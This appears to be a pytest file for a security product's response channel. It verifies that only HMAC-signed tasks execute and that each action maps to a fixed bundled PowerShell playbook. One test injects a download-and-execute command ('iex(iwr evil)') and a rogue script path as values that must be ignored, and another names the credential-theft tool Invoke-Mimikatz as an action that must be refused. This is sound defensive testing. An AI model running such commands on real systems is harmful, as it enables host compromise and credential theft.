"""
tier0: prove DeepXDR's Nexus SOAR RESPONSE channel (DC-N11, Phase C).

No C# runtime -- deepxdr_response_mirror.py re-derives the task channel the C#
ResponseChannel will implement, pinned against the canonical
project_empros/operations/agent/response_executor.py and the actual bundled
project_empros/operations/playbooks/windows/0X_*.ps1 scripts.

Security property: a DeepXDR host runs ONLY a signed Nexus task, and ONLY a fixed
bundled .ps1 chosen by action_type -- a tampered or path-injecting task is refused.
"""

import sys
from pathlib import Path

import pytest

import deepxdr_response_mirror as drm   # tier0 on sys.path via conftest

# windows_xdr_dev and project_empros are siblings under the git root.
GIT_ROOT = Path(__file__).resolve().parents[4]
PB_DIR = GIT_ROOT / "project_empros" / "operations" / "playbooks" / "windows"
CANON_DIR = GIT_ROOT / "project_empros" / "operations" / "agent"
SECRET = b"nexus-task-dispatch-secret"


def _signed(action="isolate_host", **extra):
    task = {"kind": "response", "incident_id": "INC-C", "host": "deepxdr-ep-1",
            "os_family": "windows", "action_type": action, "targets": extra.pop("targets", [])}
    task.update(extra)
    task["signature"] = drm.hmac.new(SECRET, drm._canonical(task), drm.hashlib.sha256).hexdigest()
    return task


# -- signature verification ---------------------------------------------------
def test_signed_task_verifies():
    drm.verify_task(_signed(), SECRET)


def test_unsigned_task_refused():
    t = _signed()
    del t["signature"]
    with pytest.raises(drm.ResponseError):
        drm.verify_task(t, SECRET)


def test_tampered_task_refused():
    t = _signed()
    t["targets"] = ["attacker-added"]
    with pytest.raises(drm.ResponseError):
        drm.verify_task(t, SECRET)


# -- fixed allowlist mapped to REAL bundled .ps1 scripts ----------------------
@pytest.mark.parametrize("action,script", list(drm.WIN_PLAYBOOK.items()))
def test_every_action_maps_to_a_bundled_playbook(action, script):
    assert drm.select_playbook(action) == script
    assert (PB_DIR / script).exists(), f"DeepXDR must bundle {script}"


def test_unknown_action_has_no_playbook():
    with pytest.raises(drm.ResponseError):
        drm.select_playbook("Invoke-Mimikatz")


# -- parity with the canonical Nexus-side contract (anti-drift) ---------------
def test_mirror_agrees_with_canonical_executor():
    sys.path.insert(0, str(CANON_DIR))
    import response_executor as rx
    for action in drm.WIN_PLAYBOOK:
        assert drm.select_playbook(action) == rx.select_playbook(action, "windows"), \
            f"windows playbook for {action} drifted from response_executor"
    for task in (_signed("isolate_host", mgmt_ips=["10.0.0.0/24"]),
                 _signed("block_ip", targets=["8.8.8.8"], c2_domains=["evil.test"]),
                 _signed("eradicate_process", pids=[1234], processes=["evil.exe"], hashes=["ab"]),
                 _signed("acquire_artifact", file_path="C:\\Users\\Public\\evil.exe")):
        assert drm.build_env(task) == rx.build_env(task)


# -- execution: fixed .ps1 + NEXUS_* env, never a task-supplied path ----------
def test_execute_runs_fixed_playbook_with_env():
    calls = {}

    def fake_runner(cmd, env=None, capture_output=False):
        calls["cmd"], calls["env"] = cmd, env
        return type("R", (), {"returncode": 0})()

    out = drm.execute_task(_signed("block_ip", targets=["8.8.8.8"]),
                           secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert out["status"] == "completed" and out["playbook"] == "04_Block-C2.ps1"
    assert calls["cmd"][-1] == str(PB_DIR / "04_Block-C2.ps1")
    assert calls["cmd"][:2] == ["powershell", "-NoProfile"]
    assert calls["env"]["NEXUS_C2_IPS"] == "8.8.8.8"


def test_execute_ignores_task_supplied_command():
    def fake_runner(cmd, env=None, capture_output=False):
        fake_runner.cmd = cmd
        return type("R", (), {"returncode": 0})()

    task = _signed("isolate_host", mgmt_ips=["10.0.0.0/24"],
                   playbook="C:\\pwn.ps1", command="iex(iwr evil)")
    task["signature"] = drm.hmac.new(SECRET, drm._canonical(task), drm.hashlib.sha256).hexdigest()
    out = drm.execute_task(task, secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert fake_runner.cmd[-1] == str(PB_DIR / "01_Contain-Host.ps1")
    assert out["playbook"] == "01_Contain-Host.ps1"


def test_execute_refuses_forged_task():
    task = _signed("isolate_host")
    task["targets"] = ["attacker"]
    with pytest.raises(drm.ResponseError):
        drm.execute_task(task, secret=SECRET, playbooks_dir=PB_DIR, runner=lambda *a, **k: None)


# -- E2E: Nexus signs a task → DeepXDR polls, verifies, executes, reports ------
def test_e2e_nexus_task_to_deepxdr_outcome():
    sys.path.insert(0, str(CANON_DIR))
    import task_dispatch as td

    store = td.TaskStore()
    host = "deepxdr-ep-1"
    task = td.build_response_task(incident_id="INC-E2E", host=host, os_family="windows",
                                  action_type="eradicate_process", pids=[6644],
                                  processes=["evil.exe"], secret=SECRET)
    store.enqueue(host, task)
    polled = store.poll(host)
    assert len(polled) == 1

    ran = {}

    def fake_runner(cmd, env=None, capture_output=False):
        ran["cmd"], ran["pids"] = cmd, env["NEXUS_MALICIOUS_PIDS"]
        return type("R", (), {"returncode": 0})()

    outcome = drm.execute_task(polled[0], secret=SECRET, playbooks_dir=PB_DIR, runner=fake_runner)
    assert outcome["status"] == "completed" and outcome["host"] == host
    assert outcome["playbook"] == "02_Eradicate-Process.ps1"
    assert ran["cmd"][-1] == str(PB_DIR / "02_Eradicate-Process.ps1")
    assert ran["pids"] == "6644"
